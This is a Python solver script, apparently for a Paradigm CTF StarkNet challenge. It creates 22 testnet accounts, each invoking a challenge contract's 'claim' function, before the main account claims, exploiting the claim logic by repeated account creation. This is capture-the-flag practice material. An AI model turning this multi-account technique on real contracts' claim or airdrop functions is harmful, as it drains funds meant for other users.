from starknet_py.contract import Contract
from starknet_py.net import AccountClient
from starknet_py.net.gateway_client import GatewayClient
from starknet_py.net.networks import TESTNET
from starkware.starknet.core.os.contract_address.contract_address import \
    calculate_contract_address_from_hash
from starkware.starknet.public.abi import get_storage_var_address

from paradigmctf.cairo_challenge import *

gateway_client = GatewayClient(TESTNET)


async def solver(client: AccountClient, fifs_contract: Contract):

    for i in range(0, 22):
        print("Client", i)
        player_1 = await AccountClient.create_account(gateway_client, i)

        fifs1 = Contract(fifs_contract.address, fifs_contract.data.abi, player_1)
        result = await fifs1.functions["claim"].invoke(max_fee=int(1e16))
        await result.wait_for_acceptance()

    result = await fifs_contract.functions["claim"].invoke(max_fee=int(1e16))
    await result.wait_for_acceptance()


run_solver(solver)
